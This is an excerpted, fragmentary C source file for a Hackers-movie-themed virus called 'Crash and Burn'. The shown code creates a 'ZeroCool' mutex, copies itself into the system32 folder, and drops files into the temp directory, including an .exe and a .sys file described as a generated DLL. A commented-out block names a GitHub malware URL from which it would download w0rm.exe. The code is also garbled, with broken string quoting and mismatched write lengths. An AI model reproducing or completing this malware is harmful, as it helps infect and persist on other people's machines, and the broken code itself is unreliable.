...
const char msg1[]="Crash and Burn: a virus inspired by the Hackers movie";
...
//create a mutex for CrashandBurn
{
	CreateMutexA(NULL, TRUE, "ZeroCool"); 
...
strcat(system,"\\CrashandBurn.exe"); //file name copied to %system32%\CrashandBurn.exe 
...
//create some files 
{
	...
	sprintf(txtfile, "%s\\Dade_Murphy.exe", tempdir);
	...
	if (f != INVALID_HANDLE_VALUE) {
		...
		WriteFile(f, "Mess with the best, die like the rest.", 105, &r, NULL);
		CloseHandle(f);
...
char txtfile[MAX_PATH]; 
	...
	if (f != INVALID_HANDLE_VALUE) {
		...
		WriteFile(f, "From Moscow with love <3\r\n", 105, &r, NULL);
		CloseHandle(f);
...
char txtfile[MAX_PATH]; 
	...
	STARTUPINFO sinfo;
	GetTempPath(sizeof(tempdir), tempdir);
	sprintf(txtfile, "%s\\CrashandBurn.sys", tempdir);
	f = CreateFile(txtfile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
	if (f != INVALID_HANDLE_VALUE) {
		// write a random generated DLL in %TEMP%/CrashandBurn.sys
		WriteFile(f, ""This is our world now. The world of the electron and the switch; the beauty of the baud. We exist without nationality, skin color, or religious bias. You wage wars, murder, cheat, lie to us and try to make us believe it's for our own good, yet we're the criminals. Yes, I am a criminal. My crime is that of curiosity. I am a hacker, and this is my manifesto. \r\n", 105, &r, NULL);
		CloseHandle(f);
...
/*#define site    "\\https://github.com/kaiserfarrell/malware/blob/master/Worm/w0rm.cpp";
//CrashandBurn will download file from this site
#define path    "C:\\w0rm.exe";
...
hello << "You have just gotten a wake-up call from the Nintendo Generation." <<endl;
}
